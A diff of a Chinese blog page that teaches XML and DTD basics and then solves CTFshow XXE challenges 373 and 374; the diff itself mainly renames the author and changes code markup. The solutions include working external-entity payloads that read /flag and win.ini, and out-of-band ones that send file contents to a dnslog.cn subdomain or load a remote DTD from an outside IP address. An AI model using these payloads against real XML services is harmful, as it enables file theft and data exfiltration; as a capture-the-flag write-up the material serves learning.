@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFshowXXE, Jlan&#39;s Little World">
+    <meta name="keywords" content="CTFshowXXE, J1an&#39;s Little World">
     <meta name="description" content="XML基础知识要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。
 
 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML">
@@ -19,7 +19,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFshowXXE | Jlan&#39;s Little World</title>
+    <title>CTFshowXXE | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -47,8 +47,6 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -66,7 +64,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -87,55 +85,11 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -170,7 +124,7 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -193,55 +147,11 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -401,6 +311,9 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -410,57 +323,137 @@ XML用于标记电子文件使其具有结构性的标记语言，可以用来�
 <blockquote>
 <p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
 </blockquote>
-<h3 id="xml的基本格式"><a href="#xml的基本格式" class="headerlink" title="xml的基本格式"></a>xml的基本格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 所有 XML 元素都须有关闭标签</span><br><span class="line">- XML 标签对大小写敏感</span><br><span class="line">- XML 必须正确地嵌套</span><br><span class="line">- XML 文档必须有根元素</span><br><span class="line">- XML 的属性值须加引号</span><br></pre></td></tr></table></figure>
+<h3 id="xml的基本格式"><a href="#xml的基本格式" class="headerlink" title="xml的基本格式"></a>xml的基本格式</h3><pre class="line-numbers language-none"><code class="language-none">- 所有 XML 元素都须有关闭标签
+- XML 标签对大小写敏感
+- XML 必须正确地嵌套
+- XML 文档必须有根元素
+- XML 的属性值须加引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里放一个正规的例子</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span> <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span> <span class="comment">&lt;!--bookstore的子元素，category为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span>      <span class="comment">&lt;!--book的子元素，lang为属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span>       <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> <span class="comment">&lt;!--book的子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span> <span class="comment">&lt;!--book的结束--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span> <span class="comment">&lt;!--bookstore的结束--&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--根元素--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的子元素，category为属性--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--book的子元素，lang为属性--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--book的子元素--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的子元素--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--book的结束--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstore的结束--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+&lt;!ELEMENT receiver (#PCDATA)&gt;
+&lt;!ELEMENT sender (#PCDATA)&gt;
+&lt;!ELEMENT header (#PCDATA)&gt;
+&lt;!ELEMENT msg (#PCDATA)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这样</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><span class="token punctuation">></span></span>Myself<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sender</span><span class="token punctuation">></span></span>Someone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sender</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>TheReminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msg</span><span class="token punctuation">></span></span>This is an amazing book<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msg</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>带有DTD的XML文档实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;/receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;/sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;/header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;/msg&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+&lt;!ELEMENT receiver (#PCDATA)&gt;
+&lt;!ELEMENT sender (#PCDATA)&gt;
+&lt;!ELEMENT header (#PCDATA)&gt;
+&lt;!ELEMENT msg (#PCDATA)&gt;
+&lt;message&gt;
+&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;
+&lt;sender&gt;Someone&lt;&#x2F;sender&gt;
+&lt;header&gt;TheReminder&lt;&#x2F;header&gt;
+&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;
+&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里 定义元素为<code>ANY</code>说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;
+&lt;pass&gt;mypass&lt;&#x2F;pass&gt;
+&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们使用&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被 “test” 替换。</p>
 <h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;file:///c:/test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root-element SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;Y0u&lt;&#x2F;to&gt;
+&lt;from&gt;@re&lt;&#x2F;from&gt;
+&lt;head&gt;v3ry&lt;&#x2F;head&gt;
+&lt;body&gt;g00d!&lt;&#x2F;body&gt;
+&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210305225448278.png"></p>
 <p>当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
 <p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p>
 <h3 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h3><p>用<code>&amp;实体名;</code> 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; 
+&lt;updateProfile&gt;  
+    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  
+    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  
+    ... 
+&lt;&#x2F;updateProfile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; 
+&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; 
+%an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题</p>
 <p><strong>373</strong></p>
 <p>最简单的版本咯，带回显直接构造</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xml</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">j1an</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">j1an</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xml</span> <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY xxe SYSTEM "file:///flag">
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>j1an</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ctfshow</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ctfshow</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>j1an</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>374</strong></p>
 <p>没有回显需要外带了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xml [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://&amp;file;.i1ecvd.dnslog.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;j1an&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/j1an&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE xml [
+&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;&amp;file;.i1ecvd.dnslog.cn&quot;&gt;
+]&gt;
+&lt;j1an&gt;
+&lt;ctfshow&gt;&amp;xxe;&lt;&#x2F;ctfshow&gt;
+&lt;&#x2F;j1an&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这种方法不知道为啥带不出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://20.231.29.154/1.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY[
+&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;
+&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;20.231.29.154&#x2F;1.xml&quot;&gt;
+%remote;
+%send;
+]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
